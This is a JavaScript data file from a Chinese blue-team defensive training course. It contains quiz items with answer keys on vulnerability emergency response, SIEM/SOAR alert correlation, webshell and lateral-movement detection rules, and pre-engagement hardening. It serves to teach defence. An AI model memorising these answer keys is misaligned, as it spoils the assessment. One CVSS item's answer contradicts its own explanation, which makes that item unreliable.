      {type:'multiple',question:'0day漏洞公告发布后，蓝队应立即执行的紧急动作有哪些？（多选）',options:['全网资产排查（哪些系统使用受影响组件）','WAF/IPS添加临时拦截规则','通知业务方和领导','关注官方补丁发布动态','停止所有业务'],correctIndices:[0,1,2,3],explanation:'紧急四步=排查影响+临时缓解+通知通报+关注补丁。停止所有业务通常不必要且不现实。'},
      {question:'CNVD（国家信息安全漏洞共享平台）在漏洞应急中的作用是什么？',options:['没有作用','统一发布国家级漏洞预警和处置建议','代替厂商开发补丁','管理互联网流量'],correctIndex:1,explanation:'CNVD=中国官方的漏洞预警和共享平台，发布漏洞公告、影响面评估、处置建议，是国内安全厂商和企业的主要漏洞情报来源。'},
      // CVSS评分
      {question:'CVSS评分系统满分是多少？',options:['5','10','100','1000'],correctIndex:1,explanation:'CVSS(通用漏洞评分系统)=0-10分。9.0+为严重(Critical)，7.0-8.9为高危(High)，4.0-6.9为中危，0.1-3.9为低危。'},
      {type:'fill',question:'CVSS评分主要从三个维度评估漏洞严重性：___性（攻击难度）、___性（权限要求）和___性（影响范围）。',correctAnswer:'可利用/访问/影响',explanation:'CVSS三维度=可利用性(攻击难度/是否需要认证)+影响范围(机密性/完整性/可用性)+作用域(是否跨安全边界)。'},
      // 漏洞处置方案
      {question:'以下哪项安全设备在高危漏洞应急中最适合部署虚拟补丁？',options:['防火墙','WAF/IPS','堡垒机','DLP'],correctIndex:1,explanation:'WAF/IPS可以深度检查应用层Payload，识别和阻断针对特定漏洞的攻击流量。防火墙只看到IP/端口层面，看不到具体Payload。'},
      {type:'boolean',question:'WAF虚拟补丁可以永久替代真正的应用代码修复，不需要后续打补丁。',options:['正确','错误'],correctIndex:1,explanation:'错误！虚拟补丁=临时的治标方案。真正的修复必须体现在应用代码/组件版本升级上。虚拟补丁是争取时间的缓冲手段。'},
      {type:'fill',question:'高危漏洞应急中，___是指在无法立即打补丁的情况下，通过配置WAF/IPS规则、限制端口访问、关闭受影响功能等手段降低风险。',correctAnswer:'临时缓解/临时加固',explanation:'临时缓解=降低攻击成功的可能性（如关闭受影响功能、收紧网络访问控制），为补丁部署争取时间窗口。'},
      // 实战场景
      {question:'凌晨3点，CNVD发布了一个供应链系统的RCE漏洞预警，CVSS 9.8，POC已在网上流传。你作为值班蓝队，第一步该做什么？',options:['继续睡觉','立即排查公司资产是否使用受影响系统→如果使用，马上启动应急流程','等第二天上班再处理','发朋友圈'],correctIndex:1,explanation:'CVSS 9.8+POC公开=攻击者已经在利用了。哪怕凌晨也要立即响应：排查影响→通知领导+业务→部署临时缓解措施（WAF规则/限制访问）。'},
      {type:'multiple',question:'高危漏洞应急扑灭确认后，还需要做哪些后续工作？（多选）',options:['确认所有受影响系统已修复','复盘应急响应过程（为什么能/不能及时发现）','更新资产清单和安全基线','更新SOP（为下次类似事件准备）'],correctIndices:[0,1,2,3],explanation:'闭环=确认修复+复盘改进+更新资产+更新SOP。用这次的经验教训为下次应急提速。'},
      {question:'企业有100台服务器使用了Log4j2，补丁修复需要两周。在这两周内最重要的防护措施是什么？',options:['什么都不做','通过WAF/IPS部署Log4j2利用Payload的拦截规则（虚拟补丁），并将受影响服务器限入出站LDAP连接','关掉所有Java服务器','只给最重要的服务器打补丁'],correctIndex:1,explanation:'两周窗口期内=虚拟补丁(WAF拦截)+网络限制(封禁出站LDAP连接)+24小时监控。这是唯一可行的多层临时防护方案。'},
      {type:'fill',question:'高危漏洞应急中，___是最大的敌人。攻击者通常利用漏洞公告到补丁部署之间的___窗口发动攻击。',correctAnswer:'时间/时间',explanation:'漏洞公告发布后，攻击者研究PoC→开发攻击工具只需要几小时。补丁部署需要测试→灰度→全量，通常数天到数周。这个时间差就是蓝队最危险的窗口。'},
      {type:'boolean',question:'只要能及时打上补丁，高危漏洞应急中就不需要WAF虚拟补丁。',options:['正确','错误'],correctIndex:1,explanation:'错误！打补丁需要时间：测试兼容性+灰度发布+全量部署。虚拟补丁可在5分钟内部署，覆盖实战检查点之间的时间窗口。'},
      {question:'Log4j2漏洞应急案例中，为什么很多安全团队即使打了补丁还会反复检查？',options:['不信任补丁','Log4j2可能被其他依赖间接引入（传递依赖），直接升级项目中的Log4j不一定覆盖所有使用场景','只是为了写报告','补丁有Bug'],correctIndex:1,explanation:'传递依赖问题=你的项目直接依赖了库A，库A内部又依赖了Log4j2（你并不知道）。需要深度依赖分析工具扫描整个项目树。'},
      {question:'高危漏洞应急中，"影响面评估"最关键的价值是什么？',options:['写报告用','确定应急响应的优先级和资源投入——核心系统优先、暴露互联网的系统优先','只是为了统计数字','没有什么价值'],correctIndex:1,explanation:'影响面评估=排优先级的依据。100台受影响系统中，决定先处理哪几台——答案=暴露在互联网的+核心业务的。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-19', day: 19,
    title: '多设备深度联动与告警治理',
    subtitle: '高阶攻坚周（中级→高级岗技术达标）',
    objectives: ['输出多安全设备协同联动方案', '解决告警孤岛问题', '减少误报轰炸'],
    keyPoints: ['安全设备架构联动', 'SOC告警关联', '防火墙+WAF+EDR联动', '策略治理', '告警去重'],
    content: `# Day 19：多设备深度联动与告警治理

> **阶段**：高阶攻坚周（中级→高级岗技术达标）

## 📚 核心学习内容
- 视频：安全设备架构联动 + SOC告警关联
- 文档：策略治理最佳实践

## 🔧 实操任务
- 设计防火墙+WAF+EDR联动方案
- 解决告警孤岛与误报轰炸问题

## ✅ 验收标准
- 输出《多安全设备协同联动方案》`,
    quiz: [
      // 告警孤岛
      {question:'告警孤岛问题的根本原因是什么？',options:['安全设备太多','各安全设备独立工作、告警数据未关联汇聚','人员不足','网络带宽不够'],correctIndex:1,explanation:'各安全设备（FW/WAF/IDS/EDR）有独立告警体系，若不通过SOC/SIEM统一汇聚关联分析，就形成告警孤岛。'},
      {type:'fill',question:'解决告警孤岛的核心技术手段是部署___系统进行统一告警汇聚与关联分析。',correctAnswer:'SIEM',explanation:'SIEM（安全信息与事件管理）系统统一接入各设备日志/告警，通过关联规则发现复合攻击行为。'},
      {question:'以下哪个是"告警孤岛"最典型的负面后果？',options:['看不到任何告警','攻击者从边界打到内网的完整Kill Chain被分散在不同设备的日志中，没人能看到全貌','网络变慢','设备宕机'],correctIndex:1,explanation:'告警孤岛=碎片化。WAF看到Web攻击、防火墙看到端口扫描、EDR看到异常进程，但没人把这些拼成一幅完整的攻击全景图。'},
      // 多设备联动
      {type:'multiple',question:'防火墙+WAF+EDR三者联动，以下哪些联动场景是可行的？（多选）',options:['EDR发现终端异常→通知防火墙自动封禁该终端的出站IP','WAF检测到SQL注入→通知防火墙自动封禁攻击源IP','防火墙检测到DDoS→通知WAF切换到防护模式','三者互不相干'],correctIndices:[0,1,2],explanation:'以上联动均可通过SOAR(安全编排自动化与响应)或SIEM的内置联动实现。联动是打破孤岛的关键。'},
      {question:'SOAR（安全编排自动化与响应）在多设备联动中的核心作用是什么？',options:['替代所有安全设备','将各设备的API和动作编排成自动化剧本（Playbook），实现"检测→研判→处置"的自动闭环','只做日志存储','只做报表展示'],correctIndex:1,explanation:'SOAR=自动化指挥官。定义Playbook：IF(WAF告警+EDR确认) THEN(防火墙封禁IP+通知运维)。将人工操作编排为自动执行。'},
      {type:'fill',question:'SOAR的全称是Security Orchestration, ___ and Response。',correctAnswer:'Automation',explanation:'SOAR=安全编排(Ochestration)+自动化(Automation)+响应(Response)。将分散的安全工具和能力编排成端到端的自动化工作流。'},
      {type:'boolean',question:'部署了SIEM就自动实现了多设备联动，不需要额外配置。',options:['正确','错误'],correctIndex:1,explanation:'错误！SIEM提供数据汇聚和关联分析能力，但设备之间的"动作联动"（如防火墙自动封禁）需要SIEM的联动模块/SOAR配置Playbook。'},
      // 告警去重与治理
      {question:'以下哪项是告警治理最核心的目标？',options:['让告警数量降到0','降低误报率、减少重复告警、确保每个告警都有价值','增加告警数量','忽略所有低级别告警'],correctIndex:1,explanation:'告警治理=提纯。让蓝队分析师看到的每条告警都值得关注。告警风暴（一天几千条）会让分析师麻痹，漏掉真正的攻击。'},
      {type:'fill',question:'告警治理中，___是将短时间内同一来源的同类告警合并为一条聚合告警，减少告警数量。',correctAnswer:'告警聚合/聚合',explanation:'告警聚合=同一个IP在1分钟内的100条SQL注入告警→合并为1条"某IP发起SQL注入攻击(100次)"，大幅减少告警疲劳。'},
      {type:'multiple',question:'以下哪些是有效的告警治理手段？（多选）',options:['告警聚合（合并同类告警）','告警抑制（已知噪音静默处理）','告警分级（P0-P3）','规则的精准化调优（减少误报）'],correctIndices:[0,1,2,3],explanation:'以上四项=告警治理四大法宝。聚合减量+抑制降噪+分级聚焦+调优提纯=让告警从"垃圾场"变"金矿"。'},
      {question:'"告警风暴"（短时间内大量告警爆发）出现了，蓝队应首先做什么？',options:['逐一处理每条告警','快速判断是否为规则误触发/设备异常 vs 真实的大规模攻击','直接全部忽略','关掉告警系统'],correctIndex:1,explanation:'告警风暴=异常信号，可能原因：①规则误触发（昨天更新了规则）②设备故障③真的遭到猛烈攻击。第一步=快速判断原因，不同原因处置完全不同。'},
      {type:'boolean',question:'告警治理做得好，应该让误报率（False Positive Rate）降到0%。',options:['正确','错误'],correctIndex:1,explanation:'错误！追求0%误报率不现实且危险——这意味着检测规则极度保守，必然会漏掉大量真实攻击（漏报率飙升）。治理目标是找到平衡点。'},
      // 关联规则
      {type:'fill',question:'SIEM中的关联规则可以这样写：IF(Web服务器收到SQL注入+___秒内出现异常数据库查询) THEN 产生高危告警。',correctAnswer:'5/10/30',explanation:'关联规则=时空关联。同一时间窗口内、两个不同数据源都出现异常信号→这不仅仅是巧合→提升告警置信度。'},
      {question:'SIEM关联规则的"时间窗口"设置过宽（如30分钟）会有什么问题？',options:['没问题','会产生大量误关联-（将不相关的两个事件强行关联）','系统会变慢','告警会消失'],correctIndex:1,explanation:'时间窗口过宽=把没有因果关系的两个独立事件强行关联在一起，产生误报。窗口过窄=漏掉真正的关联攻击。需根据攻击类型合理设置。'},
      // 实战
      {question:'以下哪个是多设备协同防御的最理想状态？',options:['各设备独立告警','WAF检测到攻击→自动通知防火墙封禁IP→EDR同步扫描受影响终端→SOC生成综合事件报告一条龙自动完成','手动逐一查看各设备','只有SIEM工作'],correctIndex:1,explanation:'理想联动=检测→研判→处置→追溯一条龙自动化。这是SOAR+SIEM的终极目标：让机器处理重复劳动，人专注于复杂研判。'},
      {type:'multiple',question:'以下哪些是多设备联动（防火墙+WAF+EDR+SIEM）带来的价值？（多选）',options:['减少告警孤岛，攻击全景可视化','提升处置速度（自动联动封禁）','降低人工操作失误','减少值班人数到0（完全自动化）'],correctIndices:[0,1,2],explanation:'联动价值=全景可见+自动处置+减少误操作。但无法完全替代人——复杂研判和策略设计仍需人工，联动是"辅助"不是"替代"。'},
      {question:'蓝队发现内网一台服务器正在向外大量发送数据（疑似数据泄露），但WAF和防火墙都没有告警。最可能的原因是什么？',options:['没有任何攻击','数据通过非Web协议（如DNS隧道/ICMP隧道）外传，绕过了仅关注HTTP的WAF','防火墙坏了','这是正常行为'],correctIndex:1,explanation:'WAF只关注HTTP/HTTPS=典型检测盲区。攻击者使用DNS隧道(53端口)、ICMP隧道等非Web协议绕过WAF。这说明了为什么需要多源检测——不仅要有WAF，还需要流量分析(全协议)。'},
      {type:'fill',question:'告警治理的终极目标不是让告警数量归零，而是让每一条告警都有___。',correctAnswer:'价值/意义',explanation:'每条告警都值得分析师看一眼、每个告警都能关联到可执行的动作。数量不重要，质量才是核心。'},
      {type:'boolean',question:'策略治理（Policy Governance）是告警治理的上游——只有安全策略本身合理高效，告警才能高质量。',options:['正确','错误'],correctIndex:0,explanation:'正确。治理源头=策略优化。源头策略精准，下游告警自然高质量。不解决策略问题而只在下游治理告警=治标不治本。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-20', day: 20,
    title: '攻防技战法提炼与体系化',
    subtitle: '高阶攻坚周（中级→高级岗技术达标）',
    objectives: ['输出护网攻防技战法手册', '编写完整技战法（含检测规则与处置步骤）'],
    keyPoints: ['FreeBuf技战法编写', '蓝队技战法模板', 'Webshell上传检测', '内网横向检测', '技战法体系化'],
    content: `# Day 20：攻防技战法提炼与体系化

> **阶段**：高阶攻坚周（中级→高级岗技术达标）

## 📚 核心学习内容
- 视频：FreeBuf技战法编写 + 实战技战法分享
- 文档：蓝队技战法模板

## 🔧 实操任务
- 编写"Webshell上传+内网横向"完整技战法
- 含检测规则与处置步骤

## ✅ 验收标准
- 输出《护网攻防技战法手册（边界突破篇）》`,
    quiz: [
      // 技战法定义
      {type:'multiple',question:'一份完整的蓝队技战法文档应包含哪些要素？（多选）',options:['攻击手法描述','攻击特征（流量/日志特征）','检测规则','处置步骤','加固建议'],correctIndices:[0,1,2,3,4],explanation:'完整技战法=攻击手法→特征提取→检测规则→处置步骤→加固建议，五要素缺一不可。'},
      {type:'boolean',question:'编写技战法只需要描述攻击手法，不需要提供具体的检测规则和处置步骤。',options:['正确','错误'],correctIndex:1,explanation:'错误！技战法的核心价值在于可落地——必须有具体的检测规则和处置步骤，否则只是理论描述。'},
      {question:'蓝队技战法的核心价值是什么？',options:['学术研究','将对抗某种攻击方法的"检测→处置→加固"经验固化为可复现、可传承的知识资产','展示技术水平','满足领导要求'],correctIndex:1,explanation:'技战法=知识沉淀。今天张三被这种攻击打了、经验教训写完技战法→明天李四遇到同样攻击可以直接用张三的技战法应对。'},
      {type:'fill',question:'技战法文档中的"攻击特征"部分，应提取攻击在___和___两个维度的可检测特征。',correctAnswer:'流量/日志',explanation:'流量特征=请求中的特定Payload模式、特殊Header、异常协议行为。日志特征=攻击在系统/Web日志中留下的特定事件ID、错误信息、路径模式。'},
      // Webshell检测技战法
      {question:'编写"Webshell上传"技战法时，最核心的检测特征是什么？',options:['文件大小','上传请求成功后出现的特征：①文件路径在Web可访问目录 ②文件内容包含代码执行函数 ③后续对该文件的访问','文件创建时间','文件名长度'],correctIndex:1,explanation:'检测特征=路径(Web目录)+内容(eval/exec/system等危险函数)+行为(上传后立即被访问)。三项叠加几乎100%是Webshell。'},
      {type:'fill',question:'Webshell检测的流量特征之一：上传请求的Content-Type为multipart/form-data，但上传的文件___与声明的图片类型不符（如声称.jpg但头部是<?php）。',correctAnswer:'magic bytes/文件头/魔数',explanation:'文件Magic Bytes=文件真实类型的二进制标识。声称image/jpeg但文件开头是<?php=伪装成图片的PHP脚本=Webshell。'},
      {type:'multiple',question:'以下哪些是该Webshell技战法中应包含的检测规则示例？（多选）',options:['WAF规则：检测上传文件中包含eval/exec/system','SIEM关联规则：同一IP短时间内同时触发文件上传+后续GET访问上传路径','主机检测：Web目录下最近N分钟新增的可执行脚本文件','文件完整性监控FIM：Web目录文件变更告警'],correctIndices:[0,1,2,3],explanation:'检测规则应覆盖全链路：上传层(WAF)+行为层(SIEM关联)+主机层(文件监控)+持久化层(FIM)。多检测点确保不会漏。'},
      // 内网横向检测技战法
      {question:'内网横向移动检测技战法中，最应该关注的Windows事件ID是什么？',options:['事件ID 4624（登录成功，尤其关注登录类型3=网络登录和10=远程交互）','事件ID 6005','事件ID 7036','事件ID 41'],correctIndex:0,explanation:'4624登录事件=横向移动的足迹。攻击者每跳转一台机器都会产生4624（尤其是登录类型3=网络登录，攻击者使用PTH/WMI等方式）。'},
      {type:'fill',question:'内网横向的流量特征：同一源IP在短时间内连接多个不同目标IP的___端口（Windows SMB）。',correctAnswer:'445',explanation:'445端口=SMB服务。攻击者内网扫描SMB发现可用共享和系统，Pass-the-Hash等攻击也是通过445端口发起。短时间多目标445连接=横向扫描。'},
      // 技战法体系化
      {question:'技战法体系化的含义是什么？',options:['把所有技战法放在一个文件夹里','按照ATT&CK框架的战术分类，将技战法组织成覆盖攻击全生命周期的知识体系','写的越多越好','只有一种格式'],correctIndex:1,explanation:'体系化=按攻击阶段分类（初始访问/执行/持久化/横向...），每个阶段覆盖常见的攻击技术。对照ATT&CK矩阵，检查还有哪些技术点没有技战法覆盖。'},
      {type:'boolean',question:'技战法只需覆盖最常见的攻击手法，冷门的攻击技术不需要写技战法。',options:['正确','错误'],correctIndex:1,explanation:'错误！护网攻防中攻击队专门寻找冷门攻击路径（因为常见路径都被重点防御了）。任何攻击技术只要有可能被用于护网就应该有对应的技战法。'},
      // 编写实践
      {type:'fill',question:'技战法文档中，___部分应提供具体可执行的命令或脚本，使其他分析师可以直接复制使用。',correctAnswer:'处置步骤',explanation:'处置步骤=可操作命令。如"grep 攻击IP /var/log/nginx/access.log | wc -l"比"检查该IP的访问记录"有用100倍。'},
      {question:'好的技战法和差的技战法最重要的区别是什么？',options:['篇幅长度','可操作性——好的技战法让一个新人在没有指导的情况下能独立完成检测和处置','是否使用了专业术语','是否包含图表'],correctIndex:1,explanation:'可操作性=技战法的唯一衡量标准。拿了你的技战法，能不能直接干活？不能→重写。'},
      {type:'multiple',question:'技战法的加固建议应包含哪些方面？（多选）',options:['漏洞修复（升级组件/修改代码）','策略加固（收紧权限/添加规则）','监控增强（添加告警/日志）','人员培训（提高安全意识）'],correctIndices:[0,1,2,3],explanation:'加固应全方位：技术修复+策略收紧+监控增强+人员意识。单一维度加固很容易被绕过。'},
      {question:'以下最适合做技战法共享的方式是什么？',options:['口头传授','标准化模板文档（统一结构+可搜索+可更新+示例完整）','微信群转发','PPT展示'],correctIndex:1,explanation:'标准化文档=统一模板+全文搜索+版本管理+示例代码块。口口相传的技战法会在传递中变形，不可靠。'},
      // 实战
      {question:'某技战法文档中写道："发现内网横向移动后，应对措施是加强内网安全监控"。这条处置有价值吗？',options:['很有价值','没有价值——"加强监控"是空话，应写具体操作：如"在SIEM中增加关联规则X，在核心交换机配置ACL限制横向端口"','有一定价值','不需要改'],correctIndex:1,explanation:'"加强XX"是典型的无效建议。技战法的处置部分必须有具体的Who+What+How：谁在哪台设备上执行什么操作。'},
      {type:'fill',question:'技战法的价值衡量标准不是数量，而是___——能不能让遇到同样攻击的人看了就能用。',correctAnswer:'可用性/可操作性',explanation:'一份能用的技战法>一百份只能看的技战法。编写时始终以"读者如何操作"为核心。'},
      {type:'boolean',question:'编写完技战法后应进行同行评审（Peer Review），让其他分析师验证技战法的准确性和可操作性。',options:['正确','错误'],correctIndex:0,explanation:'正确。技战法写出来≠能用。需要另一个分析师按文档操作一遍，找出遗漏和错误，经过多次迭代才能达到"开箱即用"。'},
      {question:'技战法中的检测规则应包含什么关键信息？',options:['只需要规则名称','规则部署位置（哪个设备）+规则语法+预期效果+可能的误报场景','只需要规则ID','只需要创建时间'],correctIndex:1,explanation:'完整检测规则=部署在哪里(WAF/SIEM/EDR)+具体语法+预期匹配什么攻击+会产生什么误报（让使用者有心理准备）。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-21', day: 21,
    title: '第三阶段验收考核',
    subtitle: '高阶攻坚周（中级→高级岗技术达标）',
    objectives: ['具备高级岗技术视野与方案设计能力', '通过防守方案答辩', '通过复杂事件溯源笔试', '通过漏洞应急方案评审'],
    keyPoints: ['防守方案答辩', '复杂事件溯源', '漏洞应急方案评审', '高级岗能力评估'],
    content: `# Day 21：第三阶段验收考核

> **阶段**：高阶攻坚周（中级→高级岗技术达标）

## 📚 考核内容
- 高阶考核：防守方案答辩 + 复杂事件溯源笔试 + 漏洞应急方案评审

## 🔧 实操任务
- 输出《第三阶段学习总结》

## ✅ 验收标准
- 具备高级岗技术视野与方案设计能力`,
    quiz: [
      // 高级岗评估
      {question:'高级蓝队岗与中级岗的最核心区别是什么？',options:['能处理更多告警','具备方案设计能力和技战法体系化思维','会更多编程语言','工作时间更长'],correctIndex:1,explanation:'高级岗核心能力=方案设计+深度溯源+技战法体系化+统筹管理，是从"执行者"到"设计者"的质变。'},
      {type:'multiple',question:'高级蓝队岗应具备的能力包括？（多选）',options:['独立完成防守方案设计','多设备联动与告警治理','复杂的0day漏洞应急响应','技战法体系化编写'],correctIndices:[0,1,2,3],explanation:'以上四项均为高级岗核心能力，此外还包括APT溯源和甲方汇报等综合能力。'},
      // 阶段三知识点
      {question:'APT攻击中"C2"的含义是什么？',options:['Command and Control（命令与控制）','Capture and Copy（捕获与复制）','Check and Confirm（检查与确认）','Code and Compile（编码与编译）'],correctIndex:0,explanation:'C2=Command and Control。攻击者通过C2通道远程控制被攻陷的系统，发送指令、接收窃取的数据。'},
      {question:'纵深防御的核心思想是什么？',options:['一个设备解决所有问题','多层防护——假设外层已被突破，内部各层仍需独立检测','所有流量都走VPN','只保护边界'],correctIndex:1,explanation:'纵深防御=多层独立检测。不信任外层防御，每一层都假定自己可能是最后一层防线。'},
      {type:'fill',question:'等保2.0的核心架构是"___中心、___防护"。',correctAnswer:'一个/三重',explanation:'一个中心=安全管理中心，三重防护=安全计算环境+安全区域边界+安全通信网络。'},
      {type:'boolean',question:'5Why分析的目标是找到责任人并追责。',options:['正确','错误'],correctIndex:1,explanation:'错误！5Why目标是找到系统根因并改进流程/制度/技术，不是追责。'},
      {question:'Log4j2漏洞被称为"核弹级"漏洞的原因？',options:['影响极小','几乎影响所有Java应用+CVSS 10.0满分+利用门槛极低','只有特定系统受影响','已经被修复了'],correctIndex:1,explanation:'Log4j2=Java生态最通用的日志库，全球数亿Java应用都受影响。一行日志即可触发RCE。'},
      {type:'fill',question:'高危漏洞应急中，WAF部署的临时防护规则称为___。',correctAnswer:'虚拟补丁/Virtual Patch',explanation:'虚拟补丁=在WAF上添加规则拦截恶意Payload，在不等补丁的情况下提供临时防护。'},
      {question:'告警孤岛的解决方案的核心是什么？',options:['关掉一些设备','SIEM/SOAR统一汇聚+关联+联动','减少告警规则','增加值班人员'],correctIndex:1,explanation:'SIEM汇聚数据+关联规则串联告警+SOAR自动化联动处置=打破孤岛的完整方案。'},
      {type:'multiple',question:'以下哪些是多设备联动带来的价值？（多选）',options:['攻击全景可视化','自动化快速处置','减少告警碎片化','完全替代人工分析'],correctIndices:[0,1,2],explanation:'联动=全景+提速+整合。但完全替代人工=不切实际，复杂研判仍需人类智慧。'},
      {type:'fill',question:'技战法的五大要素是：攻击手法描述、攻击___、检测规则、处置步骤和加固建议。',correctAnswer:'特征',explanation:'攻击特征=流量特征+日志特征，是检测规则编写的基础。没有特征就没法写规则。'},
      {type:'boolean',question:'技战法的核心价值在于可操作性——其他人看文档后能直接使用。',options:['正确','错误'],correctIndex:0,explanation:'正确。可操作性是技战法的唯一衡量标准。'},
      // 综合实战
      {question:'你发现内网中一台文件服务器在凌晨向境外IP通过DNS隧道持续发送数据。以下处置优先级最正确的是什么？',options:['写报告→下班','阻断外联DNS→隔离该服务器→取证分析→排查横向移动→加固','先打补丁','联系境外的IP所有者'],correctIndex:1,explanation:'优先级=止血(阻断外联)+隔离(防扩散)+取证(调查原因)+排查(内网是否还有其他主机受影响)+加固(根除漏洞)。'},
      {question:'以下哪项最能体现"从执行者到设计者"的质变？',options:['能处置更多告警','能根据企业资产和业务特征，独立设计一套完整的纵深防御和监控覆盖方案','能使用更多安全工具','加班更多'],correctIndex:1,explanation:'设计者=从0到1规划安全方案。不是"怎么做"而是"为什么要这么做"——根据威胁模型和企业实际情况设计定制化方案。'},
      {type:'fill',question:'第三阶段考核的三大项为：防守方案答辩、___笔-试和漏洞应急方案评审。',correctAnswer:'复杂事件溯源',explanation:'三项考核=方案设计答辩+事件深度溯源笔试+0day应急方案评审，三关全部通过才算高级岗技术达标。'},
      {question:'蓝队高级岗在为甲方设计防守方案时，第一步不是部署设备，而是什么？',options:['购买设备','全面资产梳理和业务风险分析——搞清楚保护什么、怕什么攻击','编写日报','排班'],correctIndex:1,explanation:'设计从理解开始。不了解资产（保护什么）、不清楚威胁（怕什么）、不知道风险（最坏结果），方案就是无的放矢。'},
      {type:'boolean',question:'AI/ML（机器学习）可以完全替代蓝队安全分析师的工作。',options:['正确','错误'],correctIndex:1,explanation:'错误！AI/ML是辅助工具（如异常检测、自动化处置），但安全研判涉及复杂推理、上下文理解、攻防博弈思维，目前AI无法完全替代人类分析。'},
      {question:'在SOAR中设计一个Playbook："当EDR检测到勒索软件加密行为→自动隔离主机+在防火墙阻断该主机所有出站通信+通知安全团队"。这个Playbook的正确性和风险是什么？',options:['完全没问题','正确但需加判断条件：确认是真实勒索软件而非正常加密软件（如Veracrypt），否则会误判导致业务中断','完全没必要','应该直接断电'],correctIndex:1,explanation:'自动化剧本需要审慎设计：攻击行为与正常行为的区分标准必须精准。勒索加密行为与正常用户加密文件的行为可能有相似之处，需要充分的上下文验证后再触发。'},
      {type:'multiple',question:'高级蓝队岗的必备素质有哪些？（多选）',options:['系统性思维（不是单点作战）','攻防双向思维（理解攻击者才会更好防守）','持续学习能力（安全技术更新快）','沟通汇报能力（向甲方/管理层清晰传达安全状态）'],correctIndices:[0,1,2,3],explanation:'高级岗=技术+思维+沟通的全面能力。能分析、能设计、能沟通、能持续成长。'},
      {type:'fill',question:'高级岗的核心思维转变：从___思维（解决眼前问题）到___思维（系统性解决一类问题）。',correctAnswer:'点/面',explanation:'从点到面=从"怎么处理这个告警"到"怎么防止这类攻击"。每次处置都沉淀为技战法和加固措施，把单次经验转化为组织能力。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  // ==================== 第四阶段：全流程模拟与统筹沉淀周（Day22-Day28） ====================
  {
    id: 'hw-e28-22', day: 22,
    title: '护网战前筹备与加固排期',
    subtitle: '全流程模拟与统筹沉淀周（高级岗全能力达标）',
    objectives: ['输出战前筹备工作清单+7天排期计划', '掌握护网全流程管理', '制定加固工作计划'],
    keyPoints: ['护网全流程管理', '战前加固清单', '7天排期计划', '漏洞修复', '策略收敛', '资产梳理'],
    content: `# Day 22：护网战前筹备与加固排期

> **阶段**：全流程模拟与统筹沉淀周（高级岗全能力达标）

## 📚 核心学习内容
- 视频：护网全流程管理 + 战前加固清单
- 新增：制定排期表

## 🔧 实操任务
- 制定战前7天加固工作计划
- 含漏洞修复、策略收敛、资产梳理

## ✅ 验收标准
- 输出《战前筹备工作清单+7天排期计划》`,
    quiz: [
      // 战前加固
      {type:'multiple',question:'护网战前7天加固计划应包含哪些核心工作？（多选）',options:['漏洞修复','策略收敛','资产梳理','补丁更新','权限审计'],correctIndices:[0,1,2,3,4],explanation:'以上五项均为战前加固核心工作，每项都应有明确目标和责任人，确保战前防线就位。'},
      {question:'战前加固阶段的"策略收敛"指的是什么？',options:['关闭所有安全策略','收紧防火墙规则、清理冗余策略、最小化开放端口','增加更多安全设备','放宽访问权限便于运维'],correctIndex:1,explanation:'策略收敛=收紧规则+清理冗余+最小化暴露面。战前把攻击面收窄到最小，让红队无从下手。'},
      {type:'boolean',question:'战前加固应该越早越好，最好在护网开始前2-3周就启动资产梳理和漏洞修复。',options:['正确','错误'],correctIndex:0,explanation:'正确。战前加固需要足够时间：漏洞修复需要测试，策略变更需要观察影响，临时抱佛脚风险极大。'},
      {type:'fill',question:'战前资产梳理的核心目标是建立完整的____，确保每台设备都在监控范围内。',correctAnswer:'资产台账',explanation:'资产台账是防守的基础——你不知道有哪些资产，就无法保护它们。梳理内容包括IP、端口、服务、责任人。'},
      // 加固计划
      {question:'战前7天加固计划中，如果时间不够，哪项工作优先级最高？',options:['漏洞修复（尤其是暴露在互联网的高危漏洞）','权限审计','资产梳理','补丁更新'],correctIndex:0,explanation:'互联网暴露面的高危漏洞=最短板，攻击者最先攻击的就是这些位置。优先级应该是：暴露面高危漏洞→策略收敛→资产梳理→权限审计→补丁更新。'},
      {type:'fill',question:'战前加固中___是指对所有系统账户进行排查：是否有过期账户未禁用、是否有异常权限的账户、所有账户是否遵循最小权限原则。',correctAnswer:'权限审计',explanation:'权限审计=排查账户和权限。战前"洗账户"防止攻击者拿到一个低权限账户后可以到处跳转。审计完=该禁的禁、该限的限。'},
      {question:'战前加固中，以下哪项最容易被遗忘但风险最大？',options:['核心服务器','测试/开发/边缘系统（因为不重视，常常是未打补丁的软柿子）','域控制器','数据库服务器'],correctIndex:1,explanation:'边缘资产=被遗忘的角落。测试服务器、老旧系统、物联网设备常常不在正式的资产管理范围内，但这些恰恰是攻击者最喜欢的突破口——没人看、没人管、漏洞满满。'},
      {type:'boolean',question:'战前资产梳理只需要列出服务器，不需要包括网络设备和安全设备。',options:['正确','错误'],correctIndex:1,explanation:'错误！交换机、路由器、防火墙、WAF本身也是资产，也可能有漏洞和配置缺陷。网络设备被控=攻击者能劫持和监听所有流量！'},
      // 7天排期
      {question:'一份合格的战前7天加固排期表最关键的特征是什么？',options:['越详细越好','每天有明确的任务目标、责任人和完成标志（Done/Not Done）','尽量把工作堆到最后一天','不需要排期'],correctIndex:1,explanation:'排期=可执行、可追踪。某天任务="由张三完成DMZ区所有服务器的高危漏洞扫描并输出报告"，完成标志="漏洞报告已提交+高危漏洞清单已录入工单系统"。'},
      {type:'multiple',question:'战前加固的资产梳理清单至少应包含哪些信息？（多选）',options:['IP地址/域名','开放的端口和服务','操作系统和版本','责任人/运维团队','业务重要性等级'],correctIndices:[0,1,2,3,4],explanation:'以上五项=资产台账的最小信息集。有了这些才能回答"这台机器要不要重点防护""开放了很多端口有什么风险""出了事找谁"。'},
